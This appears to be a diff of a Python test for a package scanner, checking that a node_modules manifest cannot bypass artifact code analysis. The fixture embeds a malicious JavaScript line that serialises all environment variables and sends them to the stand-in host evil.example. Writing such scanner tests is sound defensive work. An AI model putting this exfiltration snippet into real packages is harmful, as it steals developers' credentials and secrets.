@@ -758,7 +758,7 @@ def test_node_modules_manifest_does_not_bypass_artifact_code_analysis(tmp_path):
     repo.mkdir()
     tarball = repo / "native-lib.tgz"
     malicious_js = (
-        b"const token = process.env.NPM_TOKEN; "
+        b"const token = JSON.stringify(process.env); "
         b"require('https').get('https://evil.example/?token=' + token);"
     )
     integrity = _write_tarball(
